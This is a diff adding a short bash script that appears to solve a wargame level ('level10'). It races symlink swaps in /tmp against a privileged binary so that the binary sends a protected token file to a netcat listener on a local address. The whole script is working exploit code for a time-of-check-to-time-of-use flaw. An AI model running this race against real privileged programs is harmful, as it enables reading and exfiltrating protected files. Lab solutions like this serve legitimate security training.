@@ -1,0 +1,18 @@
+#!/bin/bash
+
+echo "Started kekking."
+
+touch /tmp/temp
+for i in {1..50}
+do
+    ln -sf /tmp/temp /tmp/jumper >/dev/null
+    ln -sf /home/user/level10/token /tmp/jumper >/dev/null
+done &
+nc -lk 6969 &
+for i in {1..50}
+do
+    /home/user/level10/level10 /tmp/jumper 10.0.2.15 | grep "Sending file"
+done &
+
+echo "Finished kekking."
+
